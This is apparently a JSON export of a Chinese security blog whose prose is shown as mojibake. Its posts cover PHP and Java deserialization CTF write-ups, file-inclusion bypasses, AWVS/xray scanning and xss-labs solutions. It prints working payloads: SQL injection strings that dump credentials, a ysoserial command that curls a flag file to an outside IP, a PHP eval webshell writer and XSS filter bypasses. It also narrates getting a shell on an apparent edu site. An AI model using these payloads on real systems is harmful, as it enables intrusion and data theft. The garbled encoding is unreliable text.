}\n```\n\nè·Ÿè¸ªprocess()å‡½æ•°,åˆ¤æ–­`$op`,ä½¿ç”¨`==`,åœˆèµ·æ¥è¦è€ƒ!!åˆ¤æ–­æ˜¯å¦ç­‰äº\"1\",æˆç«‹æ‰§è¡Œ`write()`å‡½æ•°\nä¸æˆç«‹å¾€ä¸‹èµ°å†åˆ¤æ–­æ˜¯å¦ç­‰äº\"2\",æˆç«‹æ‰§è¡Œ`read()`\n`read()`å‡½æ•°,ä¼šè¿”å›åŒ…å«æ–‡ä»¶çš„å†…å®¹,ä¹Ÿå°±æ˜¯flag\n```php\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n```\nä¸Šè¿°çš†ä¸æˆç«‹è¾“å‡º Bad Hacker!\n```php\n public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n```\n\nå› ä¸ºä¸€å¼€å§‹æ„é€ å‡½æ•°,èµ‹å€¼äº†$opçš„å€¼ç­‰äº\"1\",æ‰€ä»¥è·Ÿè¸ª`write()`,å¯ä»¥å‘ç°`write()`,ä»…æ‰§è¡Œä¸€äº›è¾“å…¥è¯­å¥å°±ç»“æŸäº†,å’Œflagæ— å…³,æ‰€æœ‰ä¸èƒ½æ‰§è¡Œ`write()`å‡½æ•°\n\n\n```php\nprivate function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n```\n\nä»£ç å…¨éƒ¨å®Œæ‰§è¡Œ,å¯¹è±¡è¢«é”€æ¯,æ‰§è¡Œææ„æ–¹æ³•,ä½¿ç”¨`===`åˆ¤æ–­æ˜¯å¦ç­‰äº\"2\",æˆç«‹å†èµ‹å€¼ä¸º\"1\",å¦åˆ™æ‰§è¡Œprocess()\n```php\nfunction __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n```\n\næ‰€ä»¥åœ¨process()å‡½æ•°é‡Œ,å°±ä¸èƒ½æ‰§è¡Œ`write()`å‡½æ•°,è¦æ‰§è¡Œ`read()`å‡½æ•°,$op==\"2\"å°±ä¸èƒ½æˆç«‹,æ­¤å¤„åˆ¤æ–­ä½¿ç”¨`==`è€Œä¸æ˜¯`===`\næ ¡éªŒå¹¶ä¸ä¸¥æ ¼,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨\" 2\",æ­¤å¤„æ˜¯ç©ºæ ¼2,æ„é€ åºåˆ—åŒ–æ•°æ®å»ç»•è¿‡\n\n### æ„é€ æ•°æ®\n\n```php\n\n```\nè¾“å‡º\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";s:2:\" 2\";s:8:\"filename\";s:12:\"/tmp/tmpfile\";s:7:\"content\";s:12:\"Hello World!\";}\n```\n\n\n### payload\n```php\n<?php\nclass FileHandler {\n\n    public $op = \" 2\";\n    public $filename = \"flag.php\";\n    public $content;\n\n    }\n$a = new FileHandler();\necho serialize($a);\n?>\n```\nè¾“å‡º\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";s:2:\" 2\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\næäº¤æ•°æ®\n```\nurl/?str=O:11:\"FileHandler\":3:{s:2:\"op\";s:2:\"%202\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\næºä»£ç æŸ¥çœ‹flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312147133.png)\n\n\n# JAVAååºåˆ—åŒ–\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820673.png)\n\nJavaä¸­é€šå¸¸ä½¿ç”¨Java.io.ObjectOutputStreamç±»ä¸­çš„writeObjectæ–¹æ³•è¿›è¡Œåºåˆ—åŒ–\njava.io.ObjectInputStreamç±»ä¸­çš„readObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820623.png)\n\n## ç‰¹å¾ \n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820429.png)\n\n\n## ååºåˆ—åŒ–æ¼æ´å®éªŒ\n\n\n### åºåˆ—åŒ–\nå°†\"hello\"ä»¥åºåˆ—åŒ–å†™å…¥a.seræ–‡ä»¶\n\n```Java\npackage com.example;\nimport java.io.ObjectOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileInputStream;\n\npublic class writeObject {\n    public static void main(String args[]) throws Exception {\n        String obj = \"hello\";\n\n        // å°†åºåˆ—åŒ–åçš„æ•°æ®å†™å…¥æ–‡ä»¶a.serä¸­ï¼Œå½“åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡åˆ°æ–‡ä»¶æ—¶ï¼Œ æŒ‰ç…§ Java çš„æ ‡å‡†çº¦å®šæ˜¯ç»™æ–‡ä»¶ä¸€ä¸ª .ser æ‰©å±•å\n        FileOutputStream fos = new FileOutputStream(\"a.ser\");\n        ObjectOutputStream os = new ObjectOutputStream(fos);\n        os.writeObject(obj);\n        os.close();\n\n        // ä»æ–‡ä»¶a.serä¸­è¯»å–æ•°æ®\n        FileInputStream fis = new FileInputStream(\"a.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n\n        // é€šè¿‡ååºåˆ—åŒ–æ¢å¤å­—ç¬¦ä¸²\n        String obj2 = (String)ois.readObject();\n        System.out.println(obj2);\n        ois.close();\n    }\n}\n```\n\nä»¥16è¿›åˆ¶æ‰“å¼€a.ser\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011835256.png)\n\nä»¥acedå¼€å¤´,Javaåºåˆ—åŒ–æ•°æ®æ ¼å¼å§‹ç»ˆä»¥åŒå­—èŠ‚çš„åå…­è¿›åˆ¶0xAC EDä½œä¸ºå¼€å¤´ï¼ŒBase64ç¼–ç ä¹‹åä¸ºrO0Aã€‚\n\n### ååºåˆ—åŒ–\nå°†a.serååºåˆ—åŒ–\n```Java\npackage com.example;\n\n\nimport java.io.ObjectInputStream;\nimport java.io.FileInputStream;\nimport java.io.Serializable;\nimport java.io.IOException;\n\n// å®šä¹‰ä¸€ä¸ªå®ç° java.io.Serializable æ¥å£çš„ç±»Test\nclass Test implements Serializable {\n    public String cmd=\"calc\";\n    // é‡å†™readObject()æ–¹æ³•\n    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\n        // æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•\n        in.defaultReadObject();\n        // æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºçš„å‘½ä»¤\n        Runtime.getRuntime().exec(cmd);\n    }\n}\n\npublic class Main{\n\n    public static void main(String args[]) throws Exception{\n        // ä»a.seræ–‡ä»¶ä¸­ååºåˆ—åŒ–testå¯¹è±¡\n        FileInputStream fis = new FileInputStream(\"a.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Test objectFromDisk = (Test)ois.readObject();\n        System.out.println(objectFromDisk.cmd);\n        ois.close();\n    }\n}\n```\n\n## ç½‘é¼æ¯think_java\næ‰“å¼€ç¯å¢ƒ,ä¸‹è½½é¢˜ç›®é™„ä»¶,ä¸¢ideaé‡Œ\n\n### ä»£ç å®¡è®¡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011924879.png)\n\nå‘ç°å¯ç–‘æ–‡ä»¶å`sqldict`,è·Ÿè¿›æŸ¥çœ‹,å¹¶æœªå¯¹å‚æ•°åšè¿‡æ»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011927102.png)\n\nç»§ç»­å®¡è®¡,å‘ç°å­˜åœ¨apiæ¥å£,/swagger-ui.html\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011930008.png)\n\n### è®¿é—®æ¥å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011942906.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011944415.png)\n\n\n### payload\nä»£ç å®¡è®¡å‡º,æ­¤å¤„å­˜åœ¨æ³¨å…¥,éœ€è¦ä½¿ç”¨#æˆ–?é—­åˆæ‰å‰é¢çš„è¯­å¥,å› ä¸ºæ­¤è¯­å¥ä¹Ÿç”¨æ¥è¿æ¥jdbc\n```\nmyapp#' union/**/select/**/database()#\nmyapp#'union/**/select/**/group_concat(column_name)from(information_schema.columns)where(table_name='user')and(table_schema='myapp')#\nmyapp#'union/**/select/**/name from user#\nmyapp#'union/**/select/**/pwd from user#\n```\n\næŸ¥å‡ºè´¦å·å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206012010419.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011959293.png)\n\nç™»å½•è·å–cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012012443.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012013818.png)\nBase64åŠ å¯†è¿‡åçš„åºåˆ—åŒ–æ•°æ®\n\næ”¾å…¥cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012016486.png)\n\nè¿™é‡Œåº”è¯¥å°±æ˜¯å°†æ•°æ®ååºåˆ—åŒ–\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012016703.png)\n\n### ncåå¼¹\nä½¿ç”¨ysoserialæ„é€ åºåˆ—åŒ–æ•°æ®\n\n```bash\njava -jar ysoserial.jar ROME \"curl http://162.14.73.93:4444 -d @flag\" |base64\n```\nç›‘å¬ç«¯å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012100951.png)\n\næ²¡æœ‰å¤–ç½‘ip,å†…ç½‘ç©¿é€,ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¯•äº†å¾ˆå¤šæ¬¡åå¼¹ä¸å›æ¥...\n","tags":["CTF","ååºåˆ—åŒ–"],"categories":["CTF"]},{"title":"æŠ¥é”™æ³¨å…¥getshellåˆ°ææƒ","url":"/2022/05/29/æŠ¥é”™æ³¨å…¥getshellåˆ°ææƒ/","content":"# å‰è¨€\nä»¥ä¸‹æœ¬åœ°ç¯å¢ƒæ­å»º\n\n# fuzz\ngoogleæ’ä»¶è¯†åˆ«åˆ°æŒ‡çº¹,apache+php\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292244063.png)\n\n\næ‰«äº†ä¸‹ç›®å½•,çˆ†å‡ºç»å¯¹è·¯å¾„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292246104.png)\n\n\nçœ‹åˆ°php?tbsn=xx,ä¸Šfuzzå¤§æ³•,æœ€åè¯•å‡ºæ¥æŠ¥é”™æ³¨å…¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292249932.png)\n\næ‰‹å·¥æ³¨å…¥ä¸è¡Œ,ç›´æ¥ä¸¢sqlmap,ç«™ç‚¹æ˜¯ä¸ªeduæ•°æ®å¤šå¾—å¾ˆ,æ–­æ–­ç»­ç»­è·‘äº†åŠå¤©\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292254846.png)\n\nå¼±å¯†ç yyds\n\nç›´æ¥ç™»å½•,å®Œå…¨æ²¡æœ‰æ ¡éªŒ,ç›´æ¥ä¼ ä¸€å¥è¯getshell\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292257176.png)\n\næƒé™å¾ˆä½\n\n# ææƒ\nè„ç‰›ææƒ,æä¸åŠ¨,åŸå› æš‚æ—¶ä¸çŸ¥é“\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292319343.png)\n\n","tags":["sqlæ³¨å…¥","getshell","ææƒ"],"categories":["æ¸—é€å®æˆ˜"]},{"title":"CTF-æ–‡ä»¶åŒ…å«","url":"/2022/05/26/CTF-æ–‡ä»¶åŒ…å«/","content":"# æ–‡ä»¶åŒ…å«è§£æ\n    æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š\n    include(),include_once()\n    require(),require_once()\n    è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚\n    å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š\n    1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚\n    2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚\n    å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚\n   \n![](https://raw.githubusercontent.com/chencicici/images/main/202205262150221.png)\n\n\n# å„ç§è¯­è¨€çš„æ–‡ä»¶åŒ…å«\n```aspx\n<!--#include file=\"1.asp\" -->\n\n<!--#include file=\"top.aspx\" -->\n```\n\n```jsp\n<c:import url=\"http://thief.one/1.jsp\">\n<jsp:include page=\"head.jsp\"/>\n<%@ include file=\"head.jsp\"%>\n```\n\n```php\n<?php Include('test.php')?>\n```\n\n# ç»•è¿‡\nä¸€äº›ç»•è¿‡æ–‡ä»¶åŒ…å«ä¹‹åæ·»åŠ åç¼€çš„æ–¹æ³•\n\n## %00æˆªæ–­\n- æ¡ä»¶ \n    magic_quotes_gpc = Off\n    phpç‰ˆæœ¬<5.3.4\n  \n```bash\nfilename=â€¦/â€¦/â€¦/www.txt%00\n```\n\n## é•¿åº¦æˆªæ–­\nç±»ä¼¼äºè„æ•°æ®å¡«å……\n\n- æ¡ä»¶\n    windows:`.`é•¿äº256\n    linux:`.`é•¿äº4096\n  \n\n```bash\nfilename=â€¦/â€¦/â€¦/www.......256ä¸ªæˆ–è€…4096ä¸ª......txt\n```\n## ?å·æˆªæ–­\nä¸å—GPCå’ŒPHPç‰ˆæœ¬çš„å½±å“ï¼Œwebserverä¼šæŠŠé—®å·å½“ä½œè¯·æ±‚çš„å‚æ•°\n\n```bash\nfilename=1.txt?\n```\n\n## ç‰¹æ®Šç¬¦å·æˆªæ–­\n```bash\n%23\n%20\n```\n\n# è¿œç¨‹åŒ…å«\néœ€è¦åœ¨php.iniä¸­æ‰“å¼€`allow_url_include`é…ç½®é¡¹\n\n## å®ä¾‹\n```bash\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%20\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%23\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt?\n```\n\n# å„ç§ä¼ªåè®®\n[å‚è€ƒ](https://www.cnblogs.com/endust/p/11804767.html)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262203868.png)\n\n```bash\nhttp://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt\nhttp://127.0.0.1:8080/include.php?filename=php://input Post:<?php system('ver')?>\n<?PHP fputs(fopen('s.php','w'),'<?php @eval($_POST[cmd])?>');?>\nhttp://127.0.0.1:8080/include.php?filename=file:///D:/phpstudy/PHPTutorial/WWW/1.txt\nhttp://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>\n```\n\n# èµ›é¢˜\n[å—é‚®CTFå¹³å°-æ–‡ä»¶åŒ…å«](http://4.chinalover.sinaapp.com/web7/index.php)\n\nä½¿ç”¨æ–‡ä»¶åŒ…å«è¯»å–,è¿”å›base64ç¼–ç è¿‡åçš„æºç \n![](https://raw.githubusercontent.com/chencicici/images/main/202205262236992.png)\n\nè§£ç å¾—åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262238320.png)\n","tags":["CTF","æ–‡ä»¶åŒ…å«"],"categories":["CTF"]},{"title":"awvsè”åŠ¨xrayæ‰«æ","url":"/2022/05/24/awvsè”åŠ¨xrayæ‰«æ/","content":"awvs çš„çˆ¬è™«å¾ˆå¥½ç”¨ï¼Œæ”¯æŒè¡¨å•åˆ†æå’Œå•é¡µåº”ç”¨çš„çˆ¬å–ï¼Œxray çš„æ‰«æèƒ½åŠ›æ¯”è¾ƒå¼ºï¼Œé€Ÿåº¦ä¹Ÿæ›´å¿«ã€‚awvs å’Œ xray æ­é…ä½¿ç”¨åˆ™æ˜¯å¦‚è™æ·»ç¿¼ã€‚\n[xrayå®˜æ–¹æ‰‹å†Œ](https://docs.xray.cool/#/scenario/awvs)\n\n# awvså®‰è£…\n[dockeré•œåƒåœ°å€](https://hub.docker.com/r/secfa/awvs)\n\n```bash\n#  pull æ‹‰å–ä¸‹è½½é•œåƒ\ndocker pull secfa/docker-awvs\n\n#  å°†Dockerçš„3443ç«¯å£æ˜ å°„åˆ°ç‰©ç†æœºçš„ 13443ç«¯å£\ndocker run -it -d -p 13443:3443 secfa/docker-awvs\n\n# å®¹å™¨çš„ç›¸å…³ä¿¡æ¯\nusername: admin@admin.com\npassword: Admin123\nAWVSç‰ˆæœ¬ï¼š14\n\n#å¦‚ä½•æ›´æ”¹å‡­æ®\n\n1.docker exec -u root -it $docker_names /bin/bash\n2./home/acunetix/.acunetix/change_credentials.sh\n3.è¾“å…¥æ‚¨çš„æ–°å‡­è¯\n```\n\n# xrayå®‰è£…\n[ä¸‹è½½åœ°å€](https://github.com/chaitin/xray/releases)\n\nå°†xrayæ·»åŠ ä¸ºå‘½ä»¤\n```bash\n## xray\nalias xray=\"/xray/xray_darwin_amd64\" #xrayè·¯å¾„\nexport alias\n```\n\n# è”åˆä½¿ç”¨\n\n- å¯åŠ¨xray\né¦–å…ˆå¯åŠ¨ xray çš„è¢«åŠ¨ä»£ç†ï¼Œä¸‹é¢çš„å‘½ä»¤å°†å¯åŠ¨ä¸€ä¸ªç›‘å¬åœ¨æ‰€æœ‰ç½‘å¡ 1111 ç«¯å£çš„ HTTP ä»£ç†, å¹¶å°†æ‰«æç»“æœä¿å­˜åœ¨ awvs.html å†…ã€‚\n```bash\nxray webscan --listen 0.0.0.0:1111 --html-output awvs.html\n```  \n![](https://raw.githubusercontent.com/chencicici/images/main/202205242323790.png)\n\n\n\n- å¯åŠ¨awvs\n    æ‰“å¼€awvså¦‚æœæµè§ˆå™¨æŠ¥ ä¸æ˜¯ç§å¯†é“¾æ¥ä¸”æ²¡æœ‰ç»§ç»­è®¿é—®,åœ¨awvsé¡µé¢ç›´æ¥è¾“å…¥`thisisunsafe`,æµè§ˆå™¨ä¼šè‡ªåŠ¨è·³è½¬\n  \n    æ·»åŠ ç›®æ ‡å¹¶è®¾ç½®ä¸ºä»…çˆ¬å–,æ­¤å¤„ä½¿ç”¨æœ¬åœ°é¶åœºç¯å¢ƒ\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242324038.png)\n  \n    ä½¿ç”¨xrayçš„ä»£ç†,å› ä¸ºæ˜¯dockerç¯å¢ƒ,ipä¸º`ç‰©ç†æœºçš„å†…ç½‘ip`,ä¸èƒ½å†™127.0.0.1æˆ–è€…localhost,è¿™æ ·awvså®¹å™¨æ‰å¯ä»¥æ‰¾åˆ°,å¦‚æœxrayåœ¨å…¬ç½‘å°±å†™å…¬ç½‘ip\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242326873.png)\n  \n    \n  \n- æ‰«æ\nç‚¹å‡»æ‰«æåç»ˆç«¯å‡ºç°å›æ˜¾åˆ™è¡¨ç¤ºæˆåŠŸ\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242329664.png)\n  \n    æ‰«æç»“æŸåä¼šå‡ºç°ä¸€ä¸ªawvs.htmlå°±æ˜¯æ‰«æç»“æœ,ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205242331538.png)\n  \n","tags":["awvs","xray"],"categories":["å·¥å…·ä½¿ç”¨"]},{"title":"xss-labsé¶åœº","url":"/2022/05/19/xss-labsé¶åœº/","content":"# less-01\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"<h2 align=center>æ¬¢è¿ç”¨æˆ·\".$str.\"</h2>\";\n?>\n```\nåå°„å‹xss,æ— è¿‡æ»¤\n\n- payload\nå¯¹äºXSSæ¼æ´ï¼Œåœ¨å®æˆ˜ä¸­æœªé¿å…å› å…³é”®å­—è¢«å‘ç°ï¼Œå¤šé‡‡ç”¨h5æ ‡ç­¾è¿›è¡Œè¯•æ¢ã€‚\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191420542.png)\n  æ³¨å…¥XSS\n  \n    ```js\n    name=<script>alert('xss')</script>\n    ```\n\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205191428059.png)\n\n\n# less-02\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"æœç´¢\"/>\n</form>\n</center>';\n?>\n```\nåå°„å‹XSS,`htmlspecialchars($str)`è¿‡æ»¤,æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ \"<\" ï¼ˆå°äºï¼‰å’Œ \">\" ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“\n\n- payload \n  æ­¤å¤„éœ€è¦å°†çªç ´ç‚¹è½¬å‘valueï¼Œé¦–å…ˆåº”è¯¥é—­åˆæ ‡ç­¾ï¼ˆâ€œ>ï¼‰ï¼Œåœ¨è¿›è¡Œxssæ³¨å…¥ã€‚\n  \n    ```js\n    keyword=\"><script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205191444081.png)\n  \n\n# less-03\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>\";\n?>\n<center><img src=level3.png></center>\n<?php \n```\nstrå’Œvalueéƒ½è¢«`.htmlspecialchars($str)`è¿‡æ»¤\n\n- payload\nå€¼å¾—æ³¨æ„çš„æ˜¯,valueä½äºinputæ ‡ç­¾ä¸Š,å¯ä»¥ä½¿ç”¨é¼ æ ‡äº‹ä»¶ç»•è¿‡\n  ```js\n    \" onfocus='javascript:alert(1)'\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191503368.png)\n\n# less-04\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>';\n?>\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Š,æ›¿æ¢`<` `>`\n\n- payload\n  ä¾æ—§å¯ä»¥ä½¿ç”¨ç‰¹æ®Šé¼ æ ‡äº‹ä»¶ç»•è¿‡\n  ```js\n  \" onfocus='javascript:alert(1)'\n  ```\n  \n# less-05\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>';\n?>\n```\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Š,æ›¿æ¢`on`,å¹¶ä¸”å…¨éƒ¨å°å†™,ä½¿ç”¨è¶…é“¾æ¥ç»•è¿‡\n\n- payload\n  ```js\n  \"> <a href=\"javascript:alert(/xss/)\">xss</a>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191520214.png)\n\n\n# less-06\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>';\n?>\n\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Š,å¢åŠ äº†æ›´å¤šæ›¿æ¢,ä½†æ˜¯æ²¡æœ‰æ›¿æ¢å¤§å°å†™\n\n- payload\nä½¿ç”¨å¤§å°å†™ç»•è¿‡\n  ```js\n  \"><Script>alert(1);</script>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191526138.png)\n\n# less-07\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( 